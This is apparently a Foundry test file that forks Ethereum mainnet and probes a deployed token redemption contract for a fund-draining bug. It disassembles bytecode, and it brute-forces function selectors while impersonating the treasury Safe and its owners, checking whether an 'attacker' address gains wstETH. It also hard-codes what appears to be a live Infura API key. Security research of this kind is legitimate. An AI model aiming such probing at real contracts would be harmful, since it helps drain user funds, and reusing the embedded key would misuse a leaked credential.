// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract TraceRCCall is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant SAFE_AT_SLOT4 = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindJumpsTo3500Area() public view {
        console.log("=== FINDING JUMPS TO RC.REDEEM AREA ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Look for PUSH2 values that would jump to 3500-3900 range
        console.log("Looking for jump targets to 3500-3900:");

        for (uint i = 0; i < code.length - 3; i++) {
            if (uint8(code[i]) == 0x61) { // PUSH2
                uint16 dest = uint16(uint8(code[i+1])) << 8 | uint16(uint8(code[i+2]));
                if (dest >= 3500 && dest <= 3900) {
                    console.log("Jump to", dest, "at offset", i);

                    // Check what's before this jump
                    if (i > 10) {
                        for (uint j = i - 10; j < i; j++) {
                            uint8 op = uint8(code[j]);
                            if (op == 0x54) console.log("  SLOAD at", j);
                            if (op == 0x33) console.log("  CALLER at", j);
                            if (op == 0x14) console.log("  EQ at", j);
                        }
                    }
                }
            }
        }
    }

    function test_AnalyzeB2118a8d() public {
        console.log("=== ANALYZING SELECTOR 0xb2118a8d ===\n");

        // This selector routes to offset 915
        // Let's see what it does

        vm.startPrank(attacker);

        // Try calling it
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xb2118a8d))
        );
        console.log("Called with no params:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xb2118a8d), attacker)
        );
        console.log("Called with address:", s2);

        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xb2118a8d), attacker, 100e18)
        );
        console.log("Called with address+amount:", s3);

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", attackerBal / 1e18);
    }

    function test_Analyze36600461() public {
        console.log("=== ANALYZING SELECTOR 0x36600461 ===\n");

        // Routes to 1937 - highest destination

        vm.startPrank(attacker);

        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461))
        );
        console.log("No params:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d1));
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461), attacker, 100e18)
        );
        console.log("With params:", s2);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_AnalyzeCff50c6e() public {
        console.log("=== ANALYZING SELECTOR 0xcff50c6e ===\n");

        // Routes to 973

        bytes memory code = REDEMPTION_1.code;

        // Look at bytecode from 973
        console.log("Bytecode from offset 973:");
        for (uint i = 973; i < 1100 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0x56) console.log(i, "JUMP");
            if (op == 0x57) console.log(i, "JUMPI");
            if (op == 0x5b) console.log(i, "JUMPDEST");
            if (op == 0x61) { // PUSH2
                uint16 dest = uint16(uint8(code[i+1])) << 8 | uint16(uint8(code[i+2]));
                if (dest >= 3000) {
                    console.log(i, "PUSH2 ->", dest);
                }
            }
        }

        // Try calling
        vm.startPrank(attacker);
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xcff50c6e), 0, attacker)
        );
        console.log("\nCall result:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }
        vm.stopPrank();
    }

    function test_AnalyzeFd424ea8() public {
        console.log("=== ANALYZING SELECTOR 0xfd424ea8 ===\n");

        // Routes to 1080 - might be a claim/withdraw function

        vm.startPrank(attacker);

        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8))
        );
        console.log("No params:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8), attacker)
        );
        console.log("With address:", s2);

        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8), 0)
        );
        console.log("With uint:", s3);

        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8), 0, attacker)
        );
        console.log("With uint+address:", s4);

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_TraceFromTreasury() public {
        console.log("=== TRACING FROM TREASURY (SLOT 4) ===\n");

        // The SLOAD at 3751 loads slot 4 (Treasury)
        // Maybe Treasury can trigger the RC.redeem

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(SAFE_AT_SLOT4);

        // Try all known selectors as Treasury
        bytes4[] memory sels = new bytes4[](20);
        sels[0] = bytes4(0xfd424ea8);
        sels[1] = bytes4(0xcff50c6e);
        sels[2] = bytes4(0x36600461);
        sels[3] = bytes4(0xb2118a8d);
        sels[4] = bytes4(0x9307e802);
        sels[5] = bytes4(0x778d364f);
        sels[6] = bytes4(0x42dbe168);
        sels[7] = bytes4(0x2ab60045);
        sels[8] = bytes4(0x04824e70);
        sels[9] = bytes4(0x1650cf97);
        sels[10] = bytes4(0xc5d664c6);
        sels[11] = bytes4(0xeda72134);
        sels[12] = bytes4(0x578063ed);
        sels[13] = bytes4(keccak256("claimFor(address,uint256)"));
        sels[14] = bytes4(keccak256("claim(uint256)"));
        sels[15] = bytes4(keccak256("finalize(uint256)"));
        sels[16] = bytes4(keccak256("execute(uint256)"));
        sels[17] = bytes4(keccak256("processRedemption(uint256)"));
        sels[18] = bytes4(keccak256("settleRedemption(uint256,address)"));
        sels[19] = bytes4(keccak256("redeemFor(address,uint256)"));

        for (uint i = 0; i < sels.length; i++) {
            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );
            if (s) {
                uint256 bal = IERC20(wstETH).balanceOf(attacker);
                if (bal > 0) {
                    console.log("*** EXPLOIT! Selector:");
                    console.logBytes4(sels[i]);
                    break;
                }
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_CheckHighOffsetCode() public view {
        console.log("=== CHECKING HIGH OFFSET CODE ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Look at code from 3000 to find what leads to RC.redeem
        console.log("Bytecode 3000-3550:");

        for (uint i = 3000; i < 3550 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x5b) console.log(i, "JUMPDEST");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x14) console.log(i, "EQ");
            if (op == 0x57) console.log(i, "JUMPI");
            if (op == 0xfd) console.log(i, "REVERT");
            if (op == 0xf1) console.log(i, "CALL");

            if (op == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel != bytes4(0) && uint32(sel) > 0x1000) {
                    console.log(i, "PUSH4:");
                    console.logBytes4(sel);
                }
            }

            if (op == 0x61) { // PUSH2
                uint16 dest = uint16(uint8(code[i+1])) << 8 | uint16(uint8(code[i+2]));
                if (dest >= 3500) {
                    console.log(i, "PUSH2 ->", dest);
                }
            }
        }
    }

    function test_BruteForceAllSelectorsAsTreasury() public {
        console.log("=== BRUTE FORCE ALL SELECTORS AS TREASURY ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // All known selectors from REDEMPTION_1
        bytes4[45] memory sels = [
            bytes4(0x715018a6), bytes4(0xc5d664c6), bytes4(0xeda72134),
            bytes4(0x578063ed), bytes4(0xf2fde38b), bytes4(0xfd424ea8),
            bytes4(0xcff50c6e), bytes4(0xe30c3978), bytes4(0x8da5cb5b),
            bytes4(0x9307e802), bytes4(0xb2118a8d), bytes4(0x778d364f),
            bytes4(0x79ba5097), bytes4(0x411557d1), bytes4(0x51cbf345),
            bytes4(0x5c975abb), bytes4(0x61d027b3), bytes4(0x42dbe168),
            bytes4(0x458f5815), bytes4(0x252c50f3), bytes4(0x2ab60045),
            bytes4(0x38a63183), bytes4(0x04824e70), bytes4(0x06e29712),
            bytes4(0x1650cf97), bytes4(0x36600461), bytes4(0xa29faff0),
            bytes4(0x70a08231), bytes4(0x07a2d13a), bytes4(0x3f14c193),
            bytes4(0x57604051), bytes4(0xddca3f43), bytes4(0x4cdad506),
            bytes4(0xba087652), bytes4(0x781b7e08), bytes4(0x42966c68),
            bytes4(0x7bde82f2), bytes4(0x23b872dd), bytes4(0xa9059cbb),
            bytes4(0x43000818), bytes4(0xaff6cbf1), bytes4(0x7d5e81e2),
            bytes4(0xde7ea79d), bytes4(0x3659cfe6), bytes4(0x4f1ef286)
        ];

        vm.startPrank(SAFE_AT_SLOT4);

        for (uint i = 0; i < sels.length; i++) {
            // Try with (address, uint256) params - common for claim/redeem functions
            (bool s,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );

            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("*** EXPLOIT FOUND! ***");
                console.log("Selector:");
                console.logBytes4(sels[i]);
                console.log("Attacker balance:", bal / 1e18);
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_CheckOwnersCanCall() public {
        console.log("=== CHECKING IF SAFE OWNERS CAN CALL ===\n");

        // Safe owners
        address[] memory owners = new address[](4);
        owners[0] = 0xaBA92efa92a7a8F10bDf3d608838D368c7860F5b;
        owners[1] = 0x52fD0D1C58Ea9f0F4336583E29b403c96143d1D0;
        owners[2] = 0x9F24fDD290c4A32a7Eef0CD0C4365fA326420Da7;
        owners[3] = 0xD795504963F418B35bFB108e5cA87e8cC97Ee067;

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        for (uint i = 0; i < owners.length; i++) {
            console.log("Testing owner:", owners[i]);

            vm.startPrank(owners[i]);

            // Try common selectors
            (bool s1,) = REDEMPTION_1.call(
                abi.encodeWithSelector(bytes4(0xfd424ea8), attacker, 100e18)
            );
            (bool s2,) = REDEMPTION_1.call(
                abi.encodeWithSelector(bytes4(0xb2118a8d), attacker)
            );

            vm.stopPrank();

            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("  *** Found exploit as owner! ***");
                break;
            }
        }

        console.log("\nVault change:", int256(IERC20(wstETH).balanceOf(VAULT)) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}
